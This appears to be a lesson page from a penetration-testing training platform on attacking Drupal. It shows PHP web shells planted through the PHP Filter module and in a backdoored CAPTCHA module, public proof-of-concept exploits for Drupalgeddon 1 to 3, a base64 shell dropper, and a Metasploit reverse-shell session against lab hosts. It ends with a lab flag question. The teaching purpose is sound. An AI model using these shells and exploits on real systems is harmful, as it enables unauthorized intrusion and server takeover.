
<h1>Attacking Drupal</h1>
<hr/>
<p>Now that we've confirmed that we are facing Drupal and fingerprinted the version let's look and see what misconfigurations and vulnerabilities we can uncover to attempt to gain internal network access.</p>
<p>Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.</p>
<hr/>
<h2>Leveraging the PHP Filter Module</h2>
<p>In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the <code>PHP filter</code> module, which "Allows embedded PHP code/snippets to be evaluated."</p>
<img class="website-screenshot" data-url="http://drupal-qa.inlanefreight.local/#overlay=admin/modules" src="/storage/modules/113/drupal_php_module.png"/>
<p>From here, we could tick the check box next to the module and scroll down to <code>Save configuration</code>. Next, we could go to Content --&gt; Add content and create a <code>Basic page</code>.</p>
<img class="website-screenshot" data-url="http://drupal-qa.inlanefreight.local/#overlay=node/add" src="/storage/modules/113/basic_page.png"/>
<p>We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common <code>cmd</code> to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard <code>system($_GET['cmd']);</code> we open up ourselves up to a "drive-by" attacker potentially coming across our web shell. Though unlikely, better safe than sorry!</p>
<pre><code class="language-php">&lt;?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?&gt;
</code></pre>
<img class="website-screenshot" data-url="http://drupal-qa.inlanefreight.local/#overlay=node/add/page" src="/storage/modules/113/basic_page_shell_7v2.png"/>
<p>We also want to make sure to set <code>Text format</code> drop-down to <code>PHP code</code>. After clicking save, we will be redirected to the new page, in this example <code>http://drupal-qa.inlanefreight.local/node/3</code>. Once saved, we can either request execute commands in the browser by appending <code>?dcfdd5e021a869fcc6dfaef8bf31377e=id</code> to the end of the URL to run the <code>id</code> command or use <code>cURL</code> on the command line. From here, we could use a bash one-liner to obtain reverse shell access.</p>
<pre><code class="language-shell-session">[!bash!]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d"&gt;"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>From version 8 onwards, the <a href="https://www.drupal.org/project/php/releases/8.x-1.1">PHP Filter</a> module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.</p>
<pre><code class="language-shell-session">[!bash!]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
</code></pre>
<p>Once downloaded go to <code>Administration</code> &gt; <code>Reports</code> &gt; <code>Available updates</code>.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Note: Location may differ based on the Drupal version and may be under the Extend menu.</p>
</div>
</div>
<img class="website-screenshot" data-url="http://drupal.inlanefreight.local/admin/reports/updates/install" src="/storage/modules/113/install_module.png"/>
<p>From here, click on <code>Browse,</code> select the file from the directory we downloaded it to, and then click <code>Install</code>.</p>
<p>Once the module is installed, we can click on <code>Content</code> and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select <code>PHP code</code> from the <code>Text format</code> dropdown.</p>
<p>With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes. Also, once we are done, we should remove or disable the <code>PHP Filter</code> module and delete any pages that we created to gain remote code execution.</p>
<hr/>
<h2>Uploading a Backdoored Module</h2>
<p>Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as <a href="https://www.drupal.org/project/captcha">CAPTCHA</a>. Scroll down and copy the link for the tar.gz <a href="https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz">archive</a>.</p>
<p>Download the archive and extract its contents.</p>
<pre><code class="language-shell-session">[!bash!]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
[!bash!]$ tar xvf captcha-8.x-1.2.tar.gz
</code></pre>
<p>Create a PHP web shell with the contents:</p>
<pre><code class="language-php">&lt;?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?&gt;
</code></pre>
<p>Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.</p>
<pre><code class="language-html">&lt;IfModule mod_rewrite.c&gt;
RewriteEngine On
RewriteBase /
&lt;/IfModule&gt;
</code></pre>
<p>The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.</p>
<pre><code class="language-shell-session">[!bash!]$ mv shell.php .htaccess captcha
[!bash!]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

&lt;SNIP&gt;
</code></pre>
<p>Assuming we have administrative access to the website, click on <code>Manage</code> and then <code>Extend</code> on the sidebar. Next, click on the <code>+ Install new module</code> button, and we will be taken to the install page, such as <code>http://drupal.inlanefreight.local/admin/modules/install</code> Browse to the backdoored Captcha archive and click <code>Install</code>.</p>
<img class="website-screenshot" data-url="http://drupal.inlanefreight.local/core/authorize.php" src="/storage/modules/113/module_installed.png"/>
<p>Once the installation succeeds, browse to <code>/modules/captcha/shell.php</code> to execute commands.</p>
<pre><code class="language-shell-session">[!bash!]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<hr/>
<h2>Leveraging Known Vulnerabilities</h2>
<p>Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed <code>Drupalgeddon</code>. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.</p>
<ul>
<li>
<p><a href="https://www.drupal.org/SA-CORE-2014-005">CVE-2014-3704</a>, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.</p>
</li>
<li>
<p><a href="https://www.drupal.org/sa-core-2018-002">CVE-2018-7600</a>, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.</p>
</li>
<li>
<p><a href="https://cvedetails.com/cve/CVE-2018-7602/">CVE-2018-7602</a>, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.</p>
</li>
</ul>
<p>Let's walk through exploiting each of these.</p>
<hr/>
<h2>Drupalgeddon</h2>
<p>As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this <a href="https://www.exploit-db.com/exploits/34992">PoC</a> script. Once an admin user is added, we could log in and enable the <code>PHP Filter</code> module to achieve remote code execution.</p>
<p>Running the script with the <code>-h</code> flag shows us the help menu.</p>
<pre><code class="language-shell-session">[!bash!]$ python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         <a class="__cf_email__" data-cfemail="f39a9d959cb39b9c9e969f9291dd9a87" href="/cdn-cgi/l/email-protection">[email protected]</a>
                     <a class="__cf_email__" data-cfemail="c8a0a7a5ada4a9aaa1bc88b8baa7bca7a6a5a9a1a4e6aba0" href="/cdn-cgi/l/email-protection">[email protected]</a>

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
</code></pre>
<p>Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user.</p>
<pre><code class="language-shell-session">[!bash!]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

&lt;SNIP&gt;

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&amp;destination=node
</code></pre>
<p>Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.</p>
<img class="website-screenshot" data-url="http://drupal-qa.inlanefreight.local/user#overlay=admin/people" src="/storage/modules/113/drupalgeddon.png"/>
<p>We could also use the <a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/">exploit/multi/http/drupal_drupageddon</a> Metasploit module to exploit this.</p>
<hr/>
<h2>Drupalgeddon2</h2>
<p>We can use <a href="https://www.exploit-db.com/exploits/44448">this</a> PoC to confirm this vulnerability.</p>
<pre><code class="language-shell-session">[!bash!]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
</code></pre>
<p>We can check quickly with <code>cURL</code> and see that the <code>hello.txt</code> file was indeed uploaded.</p>
<pre><code class="language-shell-session">[!bash!]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
</code></pre>
<p>Now let's modify the script to gain remote code execution by uploading a malicious PHP file.</p>
<pre><code class="language-php">&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ echo '&lt;?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?&gt;' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
</code></pre>
<p>Next, let's replace the <code>echo</code> command in the exploit script with a command to write out our malicious PHP script.</p>
<pre><code class="language-shell-session"> echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
</code></pre>
<p>Next, run the modified exploit script to upload our malicious PHP file.</p>
<pre><code class="language-shell-session">[!bash!]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
</code></pre>
<p>Finally, we can confirm remote code execution using <code>cURL</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<hr/>
<h2>Drupalgeddon3</h2>
<p><a href="https://github.com/rithchard/Drupalgeddon3">Drupalgeddon3</a> is an authenticated remote code execution vulnerability that affects <a href="https://www.drupal.org/sa-core-2018-004">multiple versions</a> of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.</p>
<p><img alt="image" src="https://academy.hackthebox.com/storage/modules/113/burp.png"/></p>
<p>Once we have the session cookie, we can set up the exploit module as follows.</p>
<pre><code class="language-shell-session">msf6 exploit(multi/http/drupal_drupageddon3) &gt; set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) &gt; set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) &gt; set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) &gt; set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) &gt; set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) &gt; show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
</code></pre>
<p>If successful, we will obtain a reverse shell on the target host.</p>
<pre><code class="language-shell-session">msf6 exploit(multi/http/drupal_drupageddon3) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -&gt; GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -&gt; form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -&gt; 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter &gt; getuid

Server username: www-data (33)


meterpreter &gt; sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
</code></pre>
<hr/>
<h2>Onwards</h2>
<p>We have enumerated and attacked some of the most prevalent CMS': WordPress, Drupal, and Joomla. Next, let's move on to Tomcat, which has been putting a smile on the face of pentesters for years.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="38" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="39" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="41" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
<span>vHosts needed for these questions:</span>
<ul>
<li>
<code>drupal-qa.inlanefreight.local</code>
</li>
<li>
<code>drupal-dev.inlanefreight.local</code>
</li>
</ul>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<label class="module-question" for="813"><span class="badge badge-soft-dark font-size-14 mr-2">+ 0 <i class="fad fa-cube text-success"></i></span> Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer813" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-813">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="813" id="btnAnswer813">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
